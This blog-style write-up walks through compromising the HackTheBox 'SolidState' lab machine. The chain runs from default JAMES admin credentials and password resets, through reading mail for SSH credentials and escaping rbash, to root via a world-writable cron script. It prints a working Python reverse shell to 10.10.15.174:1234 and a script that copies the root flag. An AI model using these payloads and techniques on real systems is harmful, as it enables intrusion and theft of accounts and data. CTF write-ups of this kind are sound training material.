---
layout: post
title:  "HackTheBox - SolidState"
date:   2018-01-27 01:00:00 +0100
categories: [hackthebox]
description: "No one quite knows who, or what, they are."
image:
  feature: solidstate.jpg
  credit:
  creditlink:
---


This post will describe exploitation of the Solidstate device on [HackTheBox](https://www.hackthebox.eu).

![](https://image.ibb.co/nHoHJb/1.png)

Solidstate's an interesting box, and also memorable as the day when the HTB platform shit itself from the load.  It's also a lesson in reading the damn exploit code.  I spent a long time re-running the exploit expecting stuff to happen, but the true realisation came when I sat down and actually read what the exploit did.

Enumeration
-----------------
As is tradition, we run a full nmap scan:

```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|_  256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.232 [10.10.14.232]), 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
```

So one service definitely looks interesting, James 2.3.2.  However, we have no idea what we're dealing with so lets do some research and do a quick search for any open vulnerabilities.  From this we find that 

One CVE that jumps out is an [exploit-db](https://www.exploit-db.com/exploits/35513/) python script.  This lets us inject a payload into bash_completion that will then execute only upon a user's login.  Effectively, we can run an arbitrary command, but only when a user logs in.  

However, this service has authentication.  A quick login confirms that credentials have been left as default:

![](https://image.ibb.co/h9w4yb/2.png)

From this admin panel, we can change any user's password.

![](https://image.ibb.co/bu1hjG/3.png)

This makes it easy to enumerate each user's emails in turn.  For this we simply change each password to the user's username and then we can login to each one via POP3.  On Mindy's account we find some interesting emails.

```bash
root@kali:~/htb/SolidState# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS mindy
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
``` 

We have recovered a username and password for Mindy, so let's SSH to the machine!

I think a few people actually got a shell utilising the above JAMES exploit when the device was first released.  Once someone found the credentials and logged in, someone else's payload would be executed, such as one launching a reverse shell.  This won't work now however, several months after release when most people have done the box, but it gave an initial easy and interesting access point.

Privilege Escalation
----------------------------

### Rbash escape
When we SSH to the device, we're greeted by a restricted shell.

![](https://image.ibb.co/cpZ2jG/4.png)

Escaping restricted shells could be a post in its own right so I'd recommend reading [Escape from SHELLcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells), if you're interested in the topic.

We have a few options here.  We either utilise the above James exploit to write a payload to run `/bin/bash` when we log on, bypassing the shell, or return us a reverse shell.  Alternatively, we could just bash the `--noprofile` flag to bash on login as below, so rbash isn't loaded.

![](https://image.ibb.co/e1WhjG/5.png)

Upon our enumeration, we come across an interesting world-writeable file in /opt.  This might seem quite esoteric, but just remember to always check the `/opt` and `/usr/local` directories for any interesting custom packages or scripts.  Running [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) on every box you enumerate, and learning to pick out useful information is also an invaluable skill.  I recommend doing that here and finding where this file is referenced.

![](https://image.ibb.co/dk7NjG/6.png)

```python
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python

import os
import sys
if not os.geteuid() == 0:
    sys.exit("\nOnly root can run this script\n")
```

There's nothing in crontab, but considering it's been written as if only root can run it, and is owned by root, this suggests the root user may have a cron job set up for this script.  I had an inkling that this would be the case, so I wrote a script to fetch the root flag and output it to a temporary folder.  This one was definitely more down to CTF intuition than anything else.

We place the following code in tmp.py:

```python
#!/usr/bin/env python

import os

with open('/root/root.txt', 'rb') as rootfile:
    with open('/var/tmp/.crash', 'wb') as openthis:
        openthis.write(rootfile.read())
```

After a short amount of time, the flag is indeed written to the /var/tmp directory.  

Getting a shell from this is then as simple as setting the python file to run any number of [reverse shells](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

We'll place the following in tmp.py:
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.15.174",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Wait a few minutes and:

![](https://image.ibb.co/iBjPyb/7.png)

